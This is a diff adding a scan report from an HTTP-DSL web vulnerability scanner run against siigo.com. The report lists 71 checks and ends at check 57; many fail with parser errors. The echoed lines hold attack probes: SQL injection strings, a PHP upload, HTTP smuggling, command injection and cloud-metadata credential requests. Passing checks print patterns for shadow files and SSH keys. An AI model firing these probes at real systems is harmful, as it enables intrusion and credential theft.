@@ -1,0 +1,879 @@
+════════════════════════════════════════════════════════════
+WEB SECURITY SCAN REPORT - PARALLEL EXECUTION
+════════════════════════════════════════════════════════════
+Target: https://siigo.com
+Date: miércoles, 13 de agosto de 2025, 17:30:58 EDT
+Checks: 71
+
+────────────────────────────────────────────────────────────
+CHECK: 0001_security_headers
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0001_security_headers.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Security Headers Analysis
+Target: https://siigo.com
+Extracted status and stored in $status
+Extracted X-Frame-Options using header and stored in $xframe
+Extracted Content-Security-Policy using header and stored in $csp
+Extracted Strict-Transport-Security using header and stored in $hsts
+Extracted X-Content-Type-Options using header and stored in $xcontent
+Extracted X-XSS-Protection using header and stored in $xxss
+Extracted Referrer-Policy using header and stored in $referrer
+Extracted Permissions-Policy using header and stored in $permissions
+Variable $issues set to 0
+[✓] Completed: 0001_security_headers - Found 0 of 7 vulnerabilities tested
+
+✅ Script completed in 1.667329125s
+
+────────────────────────────────────────────────────────────
+CHECK: 0002_sensitive_files
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0002_sensitive_files.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Sensitive Files Exposure
+Target: https://siigo.com
+Variable $exposed set to 0
+Extracted status and stored in $git_status
+Extracted status and stored in $env_status
+Extracted status and stored in $backup_status
+Extracted status and stored in $config_status
+Extracted status and stored in $htaccess_status
+[✓] Completed: 0002_sensitive_files - Found 0 of 15 vulnerabilities tested
+
+✅ Script completed in 4.997607833s
+
+────────────────────────────────────────────────────────────
+CHECK: 0003_sql_injection
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0003_sql_injection.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error processing block: error at line 5: no alternative matched for rule program at line 1, column 1:
+extract body as $response_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0004_xss
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0004_xss.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error processing block: error at line 5: no alternative matched for rule program at line 1, column 1:
+extract body as $response_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0005_cors
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0005_cors.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] CORS Configuration
+Target: https://siigo.com
+Variable $issues set to 0
+Extracted Access-Control-Allow-Origin using header and stored in $cors
+Extracted Access-Control-Allow-Credentials using header and stored in $creds
+[✓] Completed: 0005_cors - Found 0 of 5 vulnerabilities tested
+
+✅ Script completed in 5.300465083s
+
+────────────────────────────────────────────────────────────
+CHECK: 0006_open_redirect
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0006_open_redirect.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Open Redirect
+Target: https://siigo.com
+Variable $vulns set to 0
+Extracted Location using header and stored in $location1
+Extracted Location using header and stored in $location2
+Extracted Location using header and stored in $location3
+[✓] Completed: 0006_open_redirect - Found 0 of 6 vulnerabilities tested
+
+✅ Script completed in 4.914365667s
+
+────────────────────────────────────────────────────────────
+CHECK: 0007_csrf
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0007_csrf.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 14: no alternative matched for rule program at line 1, column 1:
+extract body as $body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0008_auth_bypass
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0008_auth_bypass.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 44: no alternative matched for rule program at line 1, column 1:
+extract body as $sqli_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0009_xxe
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0009_xxe.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] XXE Injection Testing
+Target: https://siigo.com
+Variable $xxe_found set to 0
+Extracted root: using regex and stored in $xxe_response
+Extracted status and stored in $xxe_status
+Extracted status and stored in $param_status
+Extracted localhost using regex and stored in $soap_response
+Extracted status and stored in $blind_status
+[✓] Completed: 0009_xxe - Found 0 of 4 vulnerabilities tested
+
+✅ Script completed in 7.33366425s
+
+────────────────────────────────────────────────────────────
+CHECK: 0010_ssrf
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0010_ssrf.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 27: no alternative matched for rule program at line 1, column 1:
+extract body as $metadata_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0011_command_injection
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0011_command_injection.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 25: no alternative matched for rule program at line 1, column 1:
+extract body as $whoami_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0012_ldap_injection
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0012_ldap_injection.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 15: no alternative matched for rule program at line 1, column 1:
+extract body as $wildcard_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0013_nosql_injection
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0013_nosql_injection.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 15: no alternative matched for rule program at line 1, column 1:
+extract body as $ne_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0014_template_injection
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0014_template_injection.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 14: no alternative matched for rule program at line 1, column 1:
+extract body as $math_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0015_file_upload
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0015_file_upload.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: . at line 1, column 102:
+POST "$target/upload" body "------test\r\nContent-Disposition: form-data; name="file"; filename="test.php"\r\nContent-Type: application/x-php\r\n\r\n<?php phpinfo(); ?>\r\n------test--" header "Content-Type" "multipart/form-data; boundary=----test"
+                                                                                                     ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0016_jwt
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0016_jwt.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 16: no alternative matched for rule program at line 1, column 1:
+extract body as $none_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0017_xml_injection
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0017_xml_injection.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 15: no alternative matched for rule program at line 1, column 1:
+extract body as $xpath_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0018_directory_traversal
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0018_directory_traversal.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 14: no alternative matched for rule program at line 1, column 1:
+extract body as $passwd_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0019_session_management
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0019_session_management.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 26: unexpected token: "Set-Cookie" at line 1, column 32:
+extract header "" as $session1 "Set-Cookie"
+                               ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0020_api_security
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0020_api_security.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 14: no alternative matched for rule program at line 1, column 1:
+extract body as $users_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0021_cache_poisoning
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0021_cache_poisoning.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 15: no alternative matched for rule program at line 1, column 1:
+extract body as $host_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0022_http_smuggling
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0022_http_smuggling.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 17: no alternative matched for rule program at line 1, column 1:
+body "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0023_websocket
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0023_websocket.http
+════════════════════════════════════════════════════════════
+[2025-08-13 17:22:34.899] [ERROR] Request failed: Get "https://www.siigo.com/ws": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+❌ Error: execution failed: error parsing HTTP request: unexpected token: header at line 1, column 18:
+GET "$target/ws" header "Upgrade" "websocket" header "Connection" "Upgrade" header "Origin" "http://evil.com" header "Sec-WebSocket-Version" "13" header "Sec-WebSocket-Key" "dGhlIHNhbXBsZSBub25jZQ=="
+                 ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0024_graphql
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0024_graphql.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 29:
+POST "$target/graphql" json {"query":"{ __schema { queryType { name } } }"}
+                            ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0025_subdomain_takeover
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0025_subdomain_takeover.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 14: no alternative matched for rule program at line 1, column 1:
+extract body as $body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0026_clickjacking
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0026_clickjacking.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Clickjacking Testing
+Target: https://siigo.com
+Variable $clickjack_found set to 0
+Extracted X-Frame-Options using header and stored in $xframe
+Extracted Content-Security-Policy using header and stored in $csp
+Extracted X-Frame-Options using header and stored in $login_xframe
+Extracted X-Frame-Options using header and stored in $admin_xframe
+Extracted X-Frame-Options using header and stored in $payment_xframe
+[✓] Completed: 0026_clickjacking - Found 0 of 5 vulnerabilities tested
+
+✅ Script completed in 8.334748459s
+
+────────────────────────────────────────────────────────────
+CHECK: 0027_deserialization
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0027_deserialization.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 29: no alternative matched for rule program at line 1, column 1:
+extract body as $php_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0028_business_logic
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0028_business_logic.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 16: no alternative matched for rule program at line 1, column 1:
+extract body as $negative_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0029_race_condition
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0029_race_condition.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Race Condition Testing
+Target: https://siigo.com
+Variable $race_found set to 0
+Extracted status and stored in $withdraw1
+Extracted status and stored in $withdraw2
+Extracted status and stored in $vote1
+Extracted status and stored in $vote2
+Extracted status and stored in $coupon_a
+Extracted status and stored in $coupon_b
+Extracted status and stored in $upload1
+Extracted status and stored in $upload2
+[✓] Completed: 0029_race_condition - Found 0 of 4 vulnerabilities tested
+
+✅ Script completed in 17.865759792s
+
+────────────────────────────────────────────────────────────
+CHECK: 0030_host_header
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0030_host_header.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 15: no alternative matched for rule program at line 1, column 1:
+extract body as $evil_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0031_oauth
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0031_oauth.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 28: no alternative matched for rule program at line 1, column 1:
+extract body as $state_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0032_idor
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0032_idor.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 15: no alternative matched for rule program at line 1, column 1:
+extract body as $user1_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0033_log4j
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0033_log4j.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Log4j Vulnerability Testing
+Target: https://siigo.com
+Variable $log4j_found set to 0
+Extracted status and stored in $jndi_status
+Extracted status and stored in $api_status
+Extracted status and stored in $form_status
+Extracted status and stored in $obfuscated_status
+[✓] Completed: 0033_log4j - Found $vulns of 6 vulnerabilities tested
+
+✅ Script completed in 9.7401105s
+
+────────────────────────────────────────────────────────────
+CHECK: 0034_verb_tampering
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0034_verb_tampering.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected token: / at line 1, column 14:
+TRACE $target/
+             ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0035_ssl_tls
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0035_ssl_tls.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 34: no alternative matched for rule program at line 1, column 1:
+extract body as $mixed_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0036_information_disclosure
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0036_information_disclosure.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 38: no alternative matched for rule program at line 1, column 1:
+extract body as $debug_body
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0037_sql_injection_mysql
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0037_sql_injection_mysql.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: , at line 1, column 44:
+GET "$target/search?q=1" AND extractvalue(1,concat(0x7e,version()))--"
+                                           ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0038_sql_injection_postgres
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0038_sql_injection_postgres.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: = at line 1, column 31:
+GET "$target/search?q=1" AND 1=CAST((SELECT version()) AS int)--"
+                              ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0039_sql_injection_mssql
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0039_sql_injection_mssql.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: = at line 1, column 31:
+GET "$target/search?q=1" AND 1=CONVERT(int,@@version)--"
+                              ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0040_sql_injection_oracle
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0040_sql_injection_oracle.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: = at line 1, column 31:
+GET "$target/search?q=1" AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--"
+                              ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0041_sql_injection_sqlite
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0041_sql_injection_sqlite.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: = at line 1, column 46:
+GET "$target/search?q=1" AND sqlite_version()=sqlite_version()--"
+                                             ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0042_sql_injection_python
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0042_sql_injection_python.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: , at line 1, column 51:
+GET "$target/users?filter=1" UNION SELECT username,password FROM auth_user--"
+                                                  ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0043_sql_injection_dotnet
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0043_sql_injection_dotnet.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: . at line 1, column 60:
+GET "$target/api/users?filter=1" UNION SELECT name FROM sys.tables--"
+                                                           ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0044_sql_injection_java
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0044_sql_injection_java.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: ' at line 1, column 57:
+GET "$target/api/users?filter=from User where name="test' or '1'='1""
+                                                        ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0045_nginx_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0045_nginx_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected token: id at line 1, column 34:
+GET "$target/lua?cmd=os.execute("id")"
+                                 ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0046_apache_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0046_apache_vulnerabilities.http
+════════════════════════════════════════════════════════════
+[2025-08-13 17:24:44.115] [ERROR] Request failed: Get "https://siigo.com:8009/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+❌ Error: execution failed: error parsing HTTP request: no alternative matched for rule program at line 1, column 1:
+GET "$target:8009/"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0047_tomcat_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0047_tomcat_vulnerabilities.http
+════════════════════════════════════════════════════════════
+[2025-08-13 17:25:21.242] [ERROR] Request failed: Get "https://siigo.com:8009/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+❌ Error: execution failed: error parsing HTTP request: no alternative matched for rule program at line 1, column 1:
+GET "$target:8009/"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0048_iis_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0048_iis_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error at line 38: no alternative matched for rule program at line 1, column 1:
+PROPFIND "$target/"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0049_cloud_security_general
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0049_cloud_security_general.http
+════════════════════════════════════════════════════════════
+[2025-08-13 17:25:55.766] [ERROR] Request failed: Get "http://169.254.169.254/latest/meta-data/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+❌ Error: execution failed: error parsing HTTP request: no alternative matched for rule program at line 1, column 1:
+GET "http://169.254.169.254/latest/meta-data/"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0050_aws_security
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0050_aws_security.http
+════════════════════════════════════════════════════════════
+[2025-08-13 17:26:26.283] [ERROR] Request failed: Get "http://169.254.169.254/latest/meta-data/iam/security-credentials/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+❌ Error: execution failed: error parsing HTTP request: no alternative matched for rule program at line 1, column 1:
+GET "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0051_azure_security
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0051_azure_security.http
+════════════════════════════════════════════════════════════
+[2025-08-13 17:26:56.578] [ERROR] Request failed: Get "http://169.254.169.254/metadata/instance?api-version=2021-02-01": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[2025-08-13 17:27:26.580] [ERROR] Request failed: Get "http://169.254.169.254/metadata/instance?api-version=2021-02-01": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+❌ Error: execution failed: error parsing HTTP request: no alternative matched for rule program at line 1, column 1:
+GET "http://169.254.169.254/metadata/instance?api-version=2021-02-01" header "Metadata" "true"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0052_gcp_security
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0052_gcp_security.http
+════════════════════════════════════════════════════════════
+[2025-08-13 17:27:27.269] [ERROR] Request failed: Get "http://metadata.google.internal/computeMetadata/v1/instance/": dial tcp: lookup metadata.google.internal: no such host
+[2025-08-13 17:27:27.271] [ERROR] Request failed: Get "http://metadata.google.internal/computeMetadata/v1/instance/": dial tcp: lookup metadata.google.internal: no such host
+❌ Error: execution failed: error parsing HTTP request: no alternative matched for rule program at line 1, column 1:
+GET "http://metadata.google.internal/computeMetadata/v1/instance/" header "Metadata-Flavor" "Google"
+^
+
+────────────────────────────────────────────────────────────
+CHECK: 0053_linux_general
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0053_linux_general.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] General Linux Security Testing
+Target: https://siigo.com
+Variable $linux_vulns set to 0
+Extracted root:x:0:0: using regex and stored in $passwd_file
+Extracted root: using regex and stored in $passwd_traversal
+Extracted root:\$ using regex and stored in $shadow_file
+Extracted BEGIN RSA PRIVATE KEY|BEGIN OPENSSH PRIVATE KEY using regex and stored in $ssh_key
+Extracted ssh-rsa|ssh-ed25519 using regex and stored in $auth_keys
+Extracted sudo|passwd|mysql|ssh using regex and stored in $bash_history
+Extracted PATH=|HOME=|USER= using regex and stored in $proc_environ
+Extracted python|java|node using regex and stored in $proc_cmdline
+Extracted ExecStart=|User=|WorkingDirectory= using regex and stored in $systemd_service
+Extracted root|/usr/bin|* * * * * using regex and stored in $crontab
+Extracted * * * * * using regex and stored in $user_cron
+Extracted sshd|sudo|authentication using regex and stored in $auth_log
+Extracted PHP|error|warning using regex and stored in $error_log
+Extracted Package:|Version:|Status: using regex and stored in $dpkg_status
+Extracted status and stored in $rpm_db
+Extracted iface|address|netmask using regex and stored in $net_interfaces
+Extracted nameserver|domain|search using regex and stored in $resolv_conf
+Extracted root ALL|NOPASSWD using regex and stored in $sudoers
+Extracted export|alias|function using regex and stored in $bashrc
+Extracted PATH=|export using regex and stored in $profile
+[✓] Completed: 0053_linux_general - Found 0 of 12 vulnerabilities tested
+
+✅ Script completed in 37.633577084s
+
+────────────────────────────────────────────────────────────
+CHECK: 0054_ubuntu_debian
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0054_ubuntu_debian.http
+════════════════════════════════════════════════════════════
+Variable $target set to https://siigo.com
+Variable $stop set to 0
+[SCAN] Ubuntu/Debian Security Testing
+Target: https://siigo.com
+Variable $ubuntu_vulns set to 0
+Extracted ubuntu.com|debian.org|Packages using regex and stored in $apt_lists
+Extracted cloud-init|DataSource|user-data using regex and stored in $cloudinit_log
+Extracted name:|version:|apps: using regex and stored in $snap_info
+Extracted ALLOW|DENY|ufw-user using regex and stored in $ufw_rules
+Extracted network:|ethernets:|addresses: using regex and stored in $netplan
+Extracted profile|capability|network using regex and stored in $apparmor
+Extracted attached|expires|services using regex and stored in $ua_status
+Extracted Unattended-Upgrade|Origins-Pattern using regex and stored in $unattended
+Extracted Package: linux-image|Version: using regex and stored in $dpkg_db
+Extracted #!/bin/sh|uname|lsb_release using regex and stored in $motd_scripts
+Extracted account_name|registration_key|url using regex and stored in $landscape
+Extracted Dist:|Supported:|Version: using regex and stored in $release_upgrade
+[✓] Completed: 0054_ubuntu_debian - Found 0 of 12 vulnerabilities tested
+
+✅ Script completed in 14.064044833s
+
+────────────────────────────────────────────────────────────
+CHECK: 0055_login_bypass_general
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0055_login_bypass_general.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 31:
+POST "$target/api/login" json {
+                              ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0056_nodejs_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0056_nodejs_vulnerabilities.http
+════════════════════════════════════════════════════════════
+❌ Error: execution failed: error parsing HTTP request: unexpected character: { at line 1, column 32:
+POST "$target/api/update" json {
+                               ^
+
+────────────────────────────────────────────────────────────
+CHECK: 0057_auth0_vulnerabilities
+────────────────────────────────────────────────────────────
+
+🚀 Executing HTTP Script: /Users/arturoeliasanton/github.com/arturoeanton/httpdsl/scripts/web_scan/checks/0057_auth0_vulnerabilities.http
+════════════════════════════════════════════════════════════
